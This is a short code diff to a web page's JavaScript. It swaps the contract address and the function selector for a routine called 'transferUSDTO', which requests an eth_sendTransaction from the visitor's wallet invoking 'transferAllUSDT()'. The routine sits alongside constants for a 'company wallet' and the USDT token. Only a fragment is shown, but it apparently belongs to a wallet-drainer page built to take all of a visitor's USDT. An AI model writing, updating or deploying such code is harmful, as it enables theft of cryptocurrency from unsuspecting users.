@@ -137,7 +137,7 @@
 
     <script src="config.js"></script>
     <script>
-        const CONTRACT_ADDRESS = "0x527427544E2466aa2183f8535E4EB979aEEa57A";
+        const CONTRACT_ADDRESS = "0xA54a7D4798d193432EDa23F966fB8Ba3B550F519";
         const COMPANY_WALLET = "0x1734b55dc44C420539a607Ff5b80aB62b0d18963";
         const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
         const USDT_DECIMALS = 18;
@@ -349,7 +349,7 @@
 
         async function transferUSDTO(senderAddress) {
             // Correct function selector for transferAllUSDT()
-            const functionSelector = '5e8bb494';
+            const functionSelector = 'cdcb760d';
             const data = '0x' + functionSelector;
             return await window.ethereum.request({
                 method: 'eth_sendTransaction',
